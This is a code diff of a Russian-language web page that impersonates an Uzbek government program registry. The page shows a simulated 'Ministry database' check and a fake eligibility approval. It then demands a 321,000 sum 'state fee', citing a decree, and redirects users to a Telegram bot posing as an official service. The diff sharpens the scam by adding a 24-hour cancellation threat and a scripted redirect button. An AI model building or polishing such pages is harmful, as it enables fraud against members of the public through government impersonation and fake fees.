@@ -73,15 +73,18 @@ src="https://www.facebook.com/tr?id=713550937996335&ev=PageView&noscript=1"
         <p class="text-sm text-blue-800 mt-3 font-semibold">Подключение к базе Министерства…</p>
       </div>
       <div id="iin-result" class="text-center mt-4 hidden text-green-700 font-semibold text-lg"></div>
-      <div id="filtered-confirm" class="hidden mt-6 bg-yellow-50 border border-yellow-300 p-5 rounded-xl text-left">
-  <h3 class="text-lg font-semibold text-yellow-900 mb-2">Перед продолжением:</h3>
-  <p class="text-sm text-gray-700 mb-2">Для включения в государственный реестр участников программы необходимо оплатить <span class="font-semibold text-red-600">государственную пошлину — 321 000 сум</span> в соответствии с постановлением №244.</p>
-  <p class="text-sm text-gray-700 mb-3">Без оплаты заявка не рассматривается и будет аннулирована.</p>
-  <label class="inline-flex items-center mt-2">
-    <input type="checkbox" id="confirm-understood" class="form-checkbox h-5 w-5 text-blue-600" onchange="toggleProceedToBot()">
-    <span class="ml-2 text-sm text-gray-800">Я ознакомлен(а) и согласен(на) продолжить</span>
+      <div id="consent-block" class="mt-6 hidden bg-yellow-50 border border-yellow-300 p-5 rounded-xl text-left text-sm text-gray-800">
+  <h3 class="text-base font-semibold text-yellow-900 mb-2">Завершение регистрации</h3>
+  <p class="mb-2">Для включения в реестр необходимо пройти активацию заявки.</p>
+  <p class="mb-2">Размер обязательной госпошлины составляет <span class="font-semibold text-red-600">321 000 сум</span>, согласно постановлению №244 от 17.04.2025.</p>
+  <p class="mb-3">Без оплаты заявка <u>не будет рассмотрена</u> и аннулируется в течение 24 часов.</p>
+  <label class="inline-flex items-center mb-3">
+    <input type="checkbox" id="agree-filter" class="form-checkbox h-5 w-5 text-blue-600" onchange="toggleAccessButton()">
+    <span class="ml-2">Я ознакомлен(а) и согласен(на) продолжить регистрацию</span>
   </label>
-  <a id="proceed-link" href="https://t.me/MyGovUzRasmiy_bot" target="_blank" class="w-full block mt-4 bg-blue-600 text-white py-3 rounded-xl font-medium text-center opacity-50 pointer-events-none transition">📎 Перейти в Telegram-бот</a>
+  <button id="proceed-button" onclick="redirectToBot()" disabled class="w-full bg-blue-600 text-white py-3 rounded-xl font-medium opacity-50 cursor-not-allowed transition">
+    📎 Перейти к подаче заявки
+  </button>
 </div>
       <button onclick="openFaqModal('modal-status')" class="w-full mt-6 bg-green-600 text-white py-3 rounded-xl font-medium hover:bg-green-700 transition">📄 Проверить статус заявки</button>
     </div>
@@ -187,24 +190,27 @@ src="https://www.facebook.com/tr?id=713550937996335&ev=PageView&noscript=1"
   consent.classList.add('hidden');
 
   setTimeout(() => {
-  loader.classList.add('hidden');
-  result.innerText = "✅ Вы имеете право на подачу заявки.";
-  result.classList.remove('hidden');
-
-  const filter = document.getElementById("filtered-confirm");
-  if (filter) filter.classList.remove("hidden");
-}, 4500);
-
+    loader.classList.add('hidden');
+    result.innerText = "✅ Вы имеете право на подачу заявки.";
+    result.classList.remove('hidden');
+    consent.classList.remove('hidden');
+  }, 4500);
 }
-    function toggleProceedToBot() {
-  const checkbox = document.getElementById("confirm-understood");
-  const link = document.getElementById("proceed-link");
+    function toggleAccessButton() {
+  const checkbox = document.getElementById("agree-filter");
+  const button = document.getElementById("proceed-button");
 
   if (checkbox.checked) {
-    link.classList.remove("opacity-50", "pointer-events-none");
+    button.disabled = false;
+    button.classList.remove("opacity-50", "cursor-not-allowed");
   } else {
-    link.classList.add("opacity-50", "pointer-events-none");
+    button.disabled = true;
+    button.classList.add("opacity-50", "cursor-not-allowed");
   }
+}
+
+function redirectToBot() {
+  window.location.href = "https://t.me/MyGovUzRasmiy_bot";
 }
   </script>
 
